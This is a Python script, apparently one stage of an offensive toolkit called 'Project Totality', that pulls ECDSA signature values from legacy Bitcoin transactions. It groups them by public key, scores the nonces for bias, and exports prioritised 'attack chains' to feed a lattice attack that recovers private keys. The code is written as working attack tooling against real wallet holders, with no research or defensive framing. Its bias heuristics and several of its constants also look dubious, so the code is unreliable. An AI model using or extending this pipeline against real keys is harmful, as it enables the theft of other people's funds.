#!/usr/bin/env python3
"""
PROJECT TOTALITY - PHASE 2: REAL SIGNATURE CHAIN EXTRACTION
============================================================
Verbose extraction engine for identifying multiple signatures from the same Public Key
with potential nonce bias for HNP lattice attacks.

Author: PROJECT TOTALITY Team
Status: Production Ready
"""

import os
import sys
import pandas as pd
import numpy as np
import re
import hashlib
from collections import defaultdict
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, asdict
import json

# Try to import optional dependencies
try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False
    print("⚠️  tqdm not available - progress bars disabled")

try:
    from ecdsa import VerifyingKey, SECP256k1
    from ecdsa.util import sigdecode_der
    ECDSA_AVAILABLE = True
except ImportError:
    ECDSA_AVAILABLE = False
    print("⚠️  ecdsa not available - signature verification disabled")

# ============================================================================
# CONSTANTS
# ============================================================================

P_GATEKEEPER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N_CURVE_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
TREE_BITWIDTH = 656

MIN_SIGS_FOR_ATTACK = 3  # Minimum signatures per key for lattice attack

# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class SignatureData:
    """Container for extracted signature components"""
    txid: str
    r: int
    s: int
    z: int
    pubkey: str
    script: str
    
    def to_dict(self) -> Dict:
        return {
            'txid': self.txid,
            'r': hex(self.r),
            's': hex(self.s),
            'z': hex(self.z),
            'pubkey': self.pubkey,
            'r_decimal': self.r,
            's_decimal': self.s,
            'z_decimal': self.z
        }

@dataclass
class AttackChain:
    """Container for a complete attack chain (multiple sigs from same pubkey)"""
    pubkey: str
    signatures: List[SignatureData]
    bias_score: float = 0.0
    
    def to_dict(self) -> Dict:
        return {
            'pubkey': self.pubkey,
            'signature_count': len(self.signatures),
            'bias_score': self.bias_score,
            'signatures': [sig.to_dict() for sig in self.signatures]
        }

# ============================================================================
# VERBOSE LOGGER
# ============================================================================

class VerboseLogger:
    """Handles all verbose logging operations"""
    
    def __init__(self, enabled=True):
        self.enabled = enabled
        self.stats = defaultdict(int)
        
    def log(self, message: str, level: str = "INFO"):
        if self.enabled:
            prefix = {
                "INFO": "ℹ️",
                "SUCCESS": "✅",
                "WARNING": "⚠️",
                "ERROR": "❌",
                "PHASE": "🔥",
                "DATA": "📊",
                "CRYPTO": "🔑"
            }.get(level, "•")
            print(f"{prefix} [{level}] {message}")
    
    def increment(self, stat_name: str, value: int = 1):
        self.stats[stat_name] += value
        
    def print_summary(self):
        if self.enabled and self.stats:
            print("\n" + "="*60)
            print("📊 EXTRACTION SUMMARY")
            print("="*60)
            for stat, value in sorted(self.stats.items()):
                print(f"   {stat}: {value:,}" if isinstance(value, int) and value > 1000 else f"   {stat}: {value}")
            print("="*60)

logger = VerboseLogger(enabled=True)

# ============================================================================
# PHASE 1: ENVIRONMENT PREPARATION
# ============================================================================

def initialize_environment(verbose: bool = True) -> bool:
    """
    Initialize the extraction environment and verify dependencies
    """
    logger.log("INITIALIZING VERBOSE EXTRACTION ENGINE...", "PHASE")
    
    # Check mathematical kernels
    try:
        import fpylll
        logger.log("fpylll kernel: ONLINE", "SUCCESS")
    except ImportError:
        logger.log("fpylll kernel: OFFLINE (install with: pip install fpylll)", "WARNING")
    
    if ECDSA_AVAILABLE:
        logger.log("ecdsa kernel: ONLINE", "SUCCESS")
    else:
        logger.log("ecdsa kernel: OFFLINE (install with: pip install ecdsa)", "WARNING")
    
    # Display constants
    logger.log(f"P_GATEKEEPER: {hex(P_GATEKEEPER)}", "CRYPTO")
    logger.log(f"N_CURVE_ORDER: {hex(N_CURVE_ORDER)}", "CRYPTO")
    logger.log(f"TREE_BITWIDTH: {TREE_BITWIDTH}", "CRYPTO")
    logger.log(f"MIN_SIGS_FOR_ATTACK: {MIN_SIGS_FOR_ATTACK}", "DATA")
    
    return True

# ============================================================================
# PHASE 2: DATA LOADING
# ============================================================================

def load_dataset(csv_path: str, verbose: bool = True) -> Optional[pd.DataFrame]:
    """
    Load the absolute_bridge_state.csv dataset
    """
    logger.log(f"LOADING DATASET: {csv_path}", "DATA")
    
    if not os.path.exists(csv_path):
        logger.log(f"FILE NOT FOUND: {csv_path}", "ERROR")
        return None
    
    try:
        # Get file size
        file_size_mb = os.path.getsize(csv_path) / (1024 * 1024)
        logger.log(f"File size: {file_size_mb:.2f} MB", "DATA")
        
        # Load with optimized settings
        df = pd.read_csv(csv_path, low_memory=False)
        
        logger.log(f"DATASET LOADED: {len(df):,} rows, {len(df.columns)} columns", "SUCCESS")
        logger.increment("total_rows_loaded", len(df))
        
        # Display column info
        if verbose:
            logger.log("Columns:", "DATA")
            for col in df.columns:
                null_count = df[col].isnull().sum()
                null_pct = (null_count / len(df)) * 100
                dtype = df[col].dtype
                logger.log(f"   {col}: {dtype} ({null_count:,} nulls, {null_pct:.1f}%)", "DATA")
        
        return df
        
    except Exception as e:
        logger.log(f"LOAD FAILED: {str(e)}", "ERROR")
        return None

def load_logic_master(txt_path: str, verbose: bool = True) -> str:
    """
    Load TOTAL_LOGIC_MASTER.txt for pre-extracted RSZ values
    """
    logger.log(f"LOADING LOGIC MASTER: {txt_path}", "DATA")
    
    if not os.path.exists(txt_path):
        logger.log("LOGIC MASTER NOT FOUND - will rely on CSV parsing", "WARNING")
        return ""
    
    try:
        with open(txt_path, 'r', errors='replace') as f:
            content = f.read()
        
        logger.log(f"LOGIC MASTER LOADED: {len(content):,} characters", "SUCCESS")
        logger.increment("logic_master_chars", len(content))
        
        return content
        
    except Exception as e:
        logger.log(f"LOGIC MASTER LOAD FAILED: {str(e)}", "ERROR")
        return ""

# ============================================================================
# PHASE 3: PUBLIC KEY EXTRACTION
# ============================================================================

def extract_pubkey_from_script(script_hex: str) -> Optional[str]:
    """
    Extract compressed public key from Legacy P2PKH scriptSig.
    
    Standard format: <DER_signature> <compressed_pubkey>
    Compressed pubkey: 33 bytes (66 hex chars), starts with 02 or 03
    """
    if not isinstance(script_hex, str) or len(script_hex) < 66:
        return None
    
    # Clean the script (remove spaces if present)
    script_clean = script_hex.replace(' ', '').lower()
    
    # Pattern for compressed public keys: 02/03 + 64 hex chars
    pk_pattern = re.compile(r'(0[23][a-f0-9]{64})')
    
    matches = pk_pattern.findall(script_clean)
    
    if matches:
        # Return the last pubkey (most likely the signer's)
        return matches[-1].upper()
    
    return None

def filter_legacy_p2pkh(df: pd.DataFrame, verbose: bool = True) -> pd.DataFrame:
    """
    Filter for Legacy P2PKH transactions (scriptPubKey length = 25 bytes)
    """
    logger.log("FILTERING FOR LEGACY P2PKH TRANSACTIONS", "PHASE")
    
    # Calculate script length if not present
    if 'script_len' not in df.columns:
        logger.log("Calculating script lengths...", "DATA")
        df['script_len'] = df['script'].apply(
            lambda x: len(str(x).replace(' ', '')) // 2 if pd.notnull(x) and str(x).strip() else 0
        )
    
    # Filter for 25-byte scripts (standard P2PKH: OP_DUP OP_HASH160 <20> OP_EQUALVERIFY OP_CHECKSIG)
    df_legacy = df[df['script_len'] == 25].copy()
    
    logger.log(f"Legacy P2PKH nodes identified: {len(df_legacy):,}", "SUCCESS")
    logger.increment("legacy_p2pkh_count", len(df_legacy))
    
    return df_legacy

def extract_all_pubkeys(df: pd.DataFrame, verbose: bool = True) -> pd.DataFrame:
    """
    Extract public keys from all scriptSigs
    """
    logger.log("EXTRACTING PUBLIC KEYS FROM SCRIPTSIGS", "PHASE")
    
    # Apply extraction
    df['pubkey'] = df['script'].apply(extract_pubkey_from_script)
    
    # Count extractions
    valid_count = df['pubkey'].notna().sum()
    null_count = df['pubkey'].isna().sum()
    
    logger.log(f"Valid pubkeys extracted: {valid_count:,}", "SUCCESS")
    logger.log(f"Extraction failures: {null_count:,}", "WARNING")
    logger.increment("valid_pubkeys", valid_count)
    logger.increment("extraction_failures", null_count)
    
    return df

def group_by_pubkey(df: pd.DataFrame, min_sigs: int = MIN_SIGS_FOR_ATTACK) -> Dict[str, pd.DataFrame]:
    """
    Group transactions by public key and filter for multi-signature keys
    """
    logger.log(f"GROUPING BY PUBLIC KEY (min_sigs={min_sigs})", "PHASE")
    
    # Drop rows without pubkey
    df_valid = df.dropna(subset=['pubkey']).copy()
    
    # Group by pubkey
    pk_groups = df_valid.groupby('pubkey')
    
    # Filter for keys with >= min_sigs signatures
    multi_sig_keys = {
        pk: group 
        for pk, group in pk_groups 
        if len(group) >= min_sigs
    }
    
    logger.log(f"Public keys with >= {min_sigs} signatures: {len(multi_sig_keys):,}", "SUCCESS")
    logger.increment("multi_sig_keys", len(multi_sig_keys))
    
    # Display top keys
    if multi_sig_keys:
        top_keys = sorted(multi_sig_keys.items(), key=lambda x: len(x[1]), reverse=True)[:5]
        logger.log("TOP 5 MOST ACTIVE PUBLIC KEYS:", "DATA")
        for pk, group in top_keys:
            logger.log(f"   PK: {pk[:20]}... | Signatures: {len(group):,}", "CRYPTO")
    
    return multi_sig_keys

# ============================================================================
# PHASE 4: SIGNATURE COMPONENT EXTRACTION
# ============================================================================

def parse_der_signature(sig_bytes: bytes) -> Tuple[int, int]:
    """
    Parse DER-encoded signature to extract R and S values
    """
    if not ECDSA_AVAILABLE:
        raise ImportError("ecdsa library required for DER parsing")
    
    try:
        r, s = sigdecode_der(sig_bytes, N_CURVE_ORDER)
        return r, s
    except Exception:
        return None, None

def extract_rs_from_script(script_hex: str) -> Tuple[Optional[int], Optional[int]]:
    """
    Extract R and S values from DER-encoded signature in scriptSig
    """
    if not isinstance(script_hex, str):
        return None, None
    
    try:
        # Remove spaces and convert to bytes
        script_clean = script_hex.replace(' ', '')
        script_bytes = bytes.fromhex(script_clean)
        
        # Find signature pattern (starts with 0x30)
        sig_start = script_bytes.find(b'\x30')
        if sig_start == -1:
            return None, None
        
        # Try to parse DER signature
        # This is simplified - real implementation needs proper length parsing
        for offset in range(sig_start, min(sig_start + 10, len(script_bytes) - 2)):
            try:
                # Look for DER sequence
                if script_bytes[offset] == 0x30:
                    sig_len = script_bytes[offset + 1]
                    sig_bytes = script_bytes[offset:offset + 2 + sig_len]
                    
                    r, s = parse_der_signature(sig_bytes)
                    if r and s:
                        return r, s
            except Exception:
                continue
                
    except Exception:
        pass
    
    return None, None

def extract_z_hash(row: pd.Series, logic_content: str = "") -> Optional[int]:
    """
    Extract or calculate Z (message hash) for a transaction
    """
    # Check if z_hash exists in dataframe
    if 'z_hash' in row.index and pd.notnull(row.get('z_hash')):
        z_val = row['z_hash']
        return int(z_val, 16) if isinstance(z_val, str) else int(z_val)
    
    # Check if r_scalar/s_scalar exist (might indicate pre-extracted data)
    if 'r_scalar' in row.index and 's_scalar' in row.index:
        # These might be in a separate lookup
        pass
    
    # Try to find in logic master content
    txid = row.get('txid', '')
    if txid and logic_content:
        # Search for txid in logic content
        pattern = rf'{txid}.*?(?:z|hash)[=:\s]+([a-f0-9]{{64}})'
        match = re.search(pattern, logic_content, re.IGNORECASE)
        if match:
            return int(match.group(1), 16)
    
    return None

def build_attack_chains(
    multi_sig_keys: Dict[str, pd.DataFrame],
    logic_content: str = "",
    verbose: bool = True
) -> List[AttackChain]:
    """
    Build complete attack chains with (R, S, Z) data
    """
    logger.log("BUILDING ATTACK CHAINS WITH (R, S, Z) COMPONENTS", "PHASE")
    
    attack_chains = []
    complete_count = 0
    partial_count = 0
    
    iterator = tqdm(multi_sig_keys.items(), desc="Processing chains") if TQDM_AVAILABLE else multi_sig_keys.items()
    
    for pk, group in iterator:
        signatures = []
        
        for idx, row in group.iterrows():
            txid = row.get('txid', 'unknown')
            script = row.get('script', '')
            
            # Extract R, S
            r_val, s_val = None, None
            
            # Try dataframe columns first
            if 'r_scalar' in row and pd.notnull(row.get('r_scalar')):
                r_str = str(row['r_scalar'])
                r_val = int(r_str, 16) if r_str.startswith('0x') else int(r_str)
            
            if 's_scalar' in row and pd.notnull(row.get('s_scalar')):
                s_str = str(row['s_scalar'])
                s_val = int(s_str, 16) if s_str.startswith('0x') else int(s_str)
            
            # Fallback to script parsing
            if r_val is None or s_val is None:
                r_parsed, s_parsed = extract_rs_from_script(script)
                if r_val is None:
                    r_val = r_parsed
                if s_val is None:
                    s_val = s_parsed
            
            # Extract Z
            z_val = extract_z_hash(row, logic_content)
            
            # Only add if we have all three components
            if r_val and s_val and z_val:
                sig_data = SignatureData(
                    txid=txid,
                    r=r_val,
                    s=s_val,
                    z=z_val,
                    pubkey=pk,
                    script=script
                )
                signatures.append(sig_data)
                complete_count += 1
            else:
                partial_count += 1
        
        # Add chain if it has enough complete signatures
        if len(signatures) >= MIN_SIGS_FOR_ATTACK:
            chain = AttackChain(pubkey=pk, signatures=signatures)
            attack_chains.append(chain)
    
    logger.log(f"Complete (R,S,Z) signatures: {complete_count:,}", "SUCCESS")
    logger.log(f"Incomplete signatures: {partial_count:,}", "WARNING")
    logger.log(f"Attack chains ready: {len(attack_chains):,}", "SUCCESS")
    
    logger.increment("complete_signatures", complete_count)
    logger.increment("incomplete_signatures", partial_count)
    logger.increment("attack_chains", len(attack_chains))
    
    return attack_chains

# ============================================================================
# PHASE 5: BIAS DETECTION
# ============================================================================

def calculate_bias_score(r_values: List[int]) -> float:
    """
    Calculate a bias score for a set of R values
    Higher score = more bias = better attack candidate
    
    Checks:
    1. Small R values (k might be small)
    2. Repeated upper bits
    3. Low entropy in bit distribution
    """
    if not r_values:
        return 0.0
    
    score = 0.0
    n = len(r_values)
    
    # Check 1: Small R values (< 2^128)
    small_r_count = sum(1 for r in r_values if r < 2**128)
    small_r_ratio = small_r_count / n
    score += small_r_ratio * 30  # Max 30 points
    
    # Check 2: Repeated upper 16 bits
    upper_bits = [r >> 240 for r in r_values]
    unique_upper = len(set(upper_bits))
    if unique_upper < n:
        repetition_ratio = 1 - (unique_upper / n)
        score += repetition_ratio * 40  # Max 40 points
    
    # Check 3: Low entropy in lower bits
    lower_bits = [r & 0xFFFF for r in r_values]
    unique_lower = len(set(lower_bits))
    if unique_lower < n * 0.9:  # If less than 90% unique
        score += 15  # Bonus 15 points
    
    # Check 4: R values close to each other
    if n >= 2:
        sorted_r = sorted(r_values)
        min_diff = min(sorted_r[i+1] - sorted_r[i] for i in range(n-1))
        if min_diff < 2**100:
            score += 15  # Bonus 15 points
    
    return min(score, 100)  # Cap at 100

def audit_nonce_bias(attack_chains: List[AttackChain], verbose: bool = True) -> List[AttackChain]:
    """
    Audit all attack chains for nonce bias
    """
    logger.log("AUDITING NONCE BIAS IN ATTACK CHAINS", "PHASE")
    
    biased_chains = []
    
    for chain in attack_chains:
        r_values = [sig.r for sig in chain.signatures]
        bias_score = calculate_bias_score(r_values)
        chain.bias_score = bias_score
        
        if bias_score > 20:  # Threshold for "interesting" bias
            biased_chains.append(chain)
    
    logger.log(f"Chains with significant bias (>20): {len(biased_chains):,}", "SUCCESS")
    logger.increment("biased_chains", len(biased_chains))
    
    # Display top biased chains
    if biased_chains:
        top_biased = sorted(biased_chains, key=lambda x: x.bias_score, reverse=True)[:5]
        logger.log("TOP 5 BIASED CHAINS:", "CRYPTO")
        for chain in top_biased:
            logger.log(f"   PK: {chain.pubkey[:20]}... | Bias Score: {chain.bias_score:.1f}/100 | Sigs: {len(chain.signatures)}", "SUCCESS")
    
    return biased_chains

# ============================================================================
# PHASE 6: OUTPUT & EXPORT
# ============================================================================

def export_attack_chains(
    attack_chains: List[AttackChain],
    output_dir: str = "./totality_output",
    verbose: bool = True
) -> str:
    """
    Export attack chains to JSON and CSV files
    """
    logger.log(f"EXPORTING ATTACK CHAINS TO {output_dir}", "PHASE")
    
    # Create output directory
    os.makedirs(output_dir, exist_ok=True)
    
    # Export full JSON
    json_path = os.path.join(output_dir, "attack_chains_full.json")
    with open(json_path, 'w') as f:
        json.dump([chain.to_dict() for chain in attack_chains], f, indent=2)
    logger.log(f"Full JSON exported: {json_path}", "SUCCESS")
    
    # Export summary CSV
    summary_data = []
    for chain in attack_chains:
        summary_data.append({
            'pubkey': chain.pubkey,
            'signature_count': len(chain.signatures),
            'bias_score': chain.bias_score,
            'first_txid': chain.signatures[0].txid if chain.signatures else '',
            'r_values_sample': ','.join([hex(sig.r)[:18] for sig in chain.signatures[:3]])
        })
    
    csv_path = os.path.join(output_dir, "attack_chains_summary.csv")
    df_summary = pd.DataFrame(summary_data)
    df_summary.to_csv(csv_path, index=False)
    logger.log(f"Summary CSV exported: {csv_path}", "SUCCESS")
    
    # Export biased chains only
    biased_chains = [c for c in attack_chains if c.bias_score > 20]
    if biased_chains:
        biased_json_path = os.path.join(output_dir, "biased_chains_priority.json")
        with open(biased_json_path, 'w') as f:
            json.dump([chain.to_dict() for chain in biased_chains], f, indent=2)
        logger.log(f"Biased chains exported: {biased_json_path}", "SUCCESS")
    
    return output_dir

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def run_phase2_extraction(
    csv_path: str = "/content/drive/MyDrive/CRYPTO_CONSOLIDATED/absolute_bridge_state.csv",
    logic_path: str = "/content/drive/MyDrive/CRYPTO_CONSOLIDATED/!flamingo/TOTAL_LOGIC_MASTER.txt",
    output_dir: str = "./totality_output",
    min_sigs: int = MIN_SIGS_FOR_ATTACK,
    verbose: bool = True
) -> Dict[str, Any]:
    """
    Main execution function for Phase 2 extraction
    
    Returns:
        Dictionary with extraction results and statistics
    """
    
    print("\n" + "="*70)
    print("🚀 PROJECT TOTALITY - PHASE 2: SIGNATURE CHAIN EXTRACTION")
    print("="*70 + "\n")
    
    # Phase 1: Initialize
    initialize_environment(verbose)
    
    # Phase 2: Load data
    df = load_dataset(csv_path, verbose)
    if df is None:
        logger.log("CRITICAL: Cannot proceed without dataset", "ERROR")
        return {"status": "failed", "reason": "dataset_not_found"}
    
    logic_content = load_logic_master(logic_path, verbose)
    
    # Phase 3: Extract pubkeys
    df_legacy = filter_legacy_p2pkh(df, verbose)
    
    if len(df_legacy) == 0:
        logger.log("No legacy P2PKH transactions found", "ERROR")
        return {"status": "failed", "reason": "no_legacy_p2pkh"}
    
    df_with_pks = extract_all_pubkeys(df_legacy, verbose)
    
    # Phase 4: Group and build chains
    multi_sig_keys = group_by_pubkey(df_with_pks, min_sigs)
    
    if not multi_sig_keys:
        logger.log(f"No keys with >= {min_sigs} signatures found", "WARNING")
        return {
            "status": "partial",
            "reason": "no_multi_sig_keys",
            "stats": logger.stats
        }
    
    attack_chains = build_attack_chains(multi_sig_keys, logic_content, verbose)
    
    if not attack_chains:
        logger.log("No complete (R,S,Z) chains found", "WARNING")
        return {
            "status": "partial",
            "reason": "no_complete_chains",
            "stats": logger.stats
        }
    
    # Phase 5: Bias audit
    biased_chains = audit_nonce_bias(attack_chains, verbose)
    
    # Phase 6: Export
    export_dir = export_attack_chains(attack_chains, output_dir, verbose)
    
    # Print summary
    logger.print_summary()
    
    print("\n" + "="*70)
    print("✅ PHASE 2 COMPLETE")
    print("="*70)
    print(f"   Output directory: {export_dir}")
    print(f"   Total attack chains: {len(attack_chains)}")
    print(f"   Biased chains (priority): {len(biased_chains)}")
    print(f"   Next step: Run lattice attack on biased chains")
    print("="*70 + "\n")
    
    return {
        "status": "success",
        "attack_chains": len(attack_chains),
        "biased_chains": len(biased_chains),
        "output_dir": export_dir,
        "stats": dict(logger.stats)
    }

# ============================================================================
# CLI ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Project Totality Phase 2 Extraction")
    parser.add_argument("--csv", type=str, help="Path to absolute_bridge_state.csv")
    parser.add_argument("--logic", type=str, help="Path to TOTAL_LOGIC_MASTER.txt")
    parser.add_argument("--output", type=str, default="./totality_output", help="Output directory")
    parser.add_argument("--min-sigs", type=int, default=MIN_SIGS_FOR_ATTACK, help="Minimum signatures per key")
    parser.add_argument("--quiet", action="store_true", help="Reduce verbosity")
    
    args = parser.parse_args()
    
    result = run_phase2_extraction(
        csv_path=args.csv,
        logic_path=args.logic,
        output_dir=args.output,
        min_sigs=args.min_sigs,
        verbose=not args.quiet
    )
    
    sys.exit(0 if result["status"] == "success" else 1)
